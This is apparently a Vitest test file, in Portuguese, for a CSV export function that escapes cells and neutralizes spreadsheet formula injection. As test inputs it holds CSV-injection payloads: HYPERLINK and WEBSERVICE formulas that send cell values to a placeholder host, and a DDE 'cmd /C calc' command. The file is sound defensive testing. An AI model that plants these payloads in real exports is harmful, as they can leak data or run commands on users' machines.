import { describe, expect, it } from 'vitest';
import { celulaCsv, montarCsv, neutralizarFormula } from './exportar';

describe('exportação CSV pt-BR', () => {
  it('separa por ponto e vírgula, usa vírgula decimal, escapa aspas e quebras e trata vazios', () => {
    expect(celulaCsv(1234.5)).toBe('1234,5'); expect(celulaCsv('a;b')).toBe('"a;b"'); expect(celulaCsv('diz "oi"')).toBe('"diz ""oi"""'); expect(celulaCsv(undefined)).toBe(''); expect(celulaCsv(null)).toBe('');
    expect(montarCsv(['ID', 'Valor'], [['A-1', 10], ['B-2', 0.25]])).toBe('ID;Valor\r\nA-1;10\r\nB-2;0,25');
  });
});

describe('exportação CSV: injeção de fórmula', () => {
  it('texto que começa com = + - @ vira texto, com apóstrofo na frente', () => {
    expect(celulaCsv('=1+1')).toBe("'=1+1");
    expect(celulaCsv('+cmd')).toBe("'+cmd");
    expect(celulaCsv('-2+3')).toBe("'-2+3");
    expect(celulaCsv('@SUM(A1:A9)')).toBe("'@SUM(A1:A9)");
  });
  it('cargas conhecidas: HYPERLINK, DDE e WEBSERVICE não saem como fórmula', () => {
    for (const carga of ['=HYPERLINK("http://exemplo.invalido/?x="&A1;"clique")', "=cmd|' /C calc'!A0", '=WEBSERVICE("http://exemplo.invalido/"&B2)', '@SUM(1+1)*cmd|\' /C calc\'!A0', '+IMPORTXML("http://exemplo.invalido";"//a")']) {
      const celula = celulaCsv(carga);
      const conteudo = celula.startsWith('"') ? celula.slice(1) : celula;
      expect(conteudo.startsWith("'")).toBe(true);
    }
    // com ponto e vírgula e aspas, continua entre aspas E neutralizado
    expect(celulaCsv('=HYPERLINK("a";"b")')).toBe('"\'=HYPERLINK(""a"";""b"")"');
  });
  it('espaço, TAB, CR ou LF à esquerda não escondem a fórmula', () => {
    expect(celulaCsv('  =1+1')).toBe("'  =1+1");
    expect(celulaCsv('\t=1+1')).toBe('"\'\t=1+1"');
    expect(celulaCsv('\r=1+1')).toBe('"\'\r=1+1"');
    expect(celulaCsv('\n@x')).toBe('"\'\n@x"');
    expect(celulaCsv(`${String.fromCharCode(0)}=1+1`).startsWith("'")).toBe(true);
    expect(celulaCsv(`${String.fromCharCode(160)}=1+1`).startsWith("'")).toBe(true);
  });
  it('número de verdade e texto que é só número com sinal seguem intactos', () => {
    expect(celulaCsv(-1234.5)).toBe('-1234,5');
    expect(celulaCsv(-0.25)).toBe('-0,25');
    expect(celulaCsv('-12,5')).toBe('-12,5');
    expect(celulaCsv('+7')).toBe('+7');
    expect(celulaCsv('-1.234,56')).toBe('-1.234,56');
    expect(celulaCsv('-10%')).toBe('-10%');
  });
  it('número com sinal seguido de qualquer outra coisa é texto, e é neutralizado', () => {
    expect(celulaCsv('-1+cmd')).toBe("'-1+cmd");
    expect(celulaCsv('+55 (62) 90000-0000')).toBe("'+55 (62) 90000-0000");
    expect(celulaCsv('-')).toBe("'-");
  });
  it('regressão: texto comum não ganha apóstrofo, mesmo com os sinais no meio', () => {
    for (const s of ['Ana Lima', 'a=b', 'A-1', 'contato@eiff.com.br', '(62) 90000-0000', 'Galpão 20 x 60 m', '— sem dado', '11/11/2026, 16:01', 'vão 20 m · comprimento 60 m']) expect(celulaCsv(s)).toBe(s);
    expect(neutralizarFormula('')).toBe('');
  });
  it('o CSV montado neutraliza cada célula, inclusive o cabeçalho', () => {
    expect(montarCsv(['Nome', '=Empresa'], [['=1+1', '@x'], ['Ana', -3]])).toBe("Nome;'=Empresa\r\n'=1+1;'@x\r\nAna;-3");
  });
  it('lead com nome malicioso (formulário público) sai inofensivo na exportação da tela', () => {
    const linha = ['=HYPERLINK("http://exemplo.invalido";"Ana")', '@Empresa', '-Cidade', 'ana@exemplo.com.br', '+55 62 90000-0000'];
    for (const c of montarCsv(['Nome', 'Empresa', 'Cidade', 'E-mail', 'Telefone'], [linha]).split('\r\n')[1].match(/("(?:[^"]|"")*"|[^;]*)(?:;|$)/g) ?? []) {
      const v = c.replace(/;$/, '').replace(/^"/, '');
      if (v !== '' && /^[=+\-@]/.test(v)) throw new Error(`célula começando como fórmula: ${v}`);
    }
  });
});
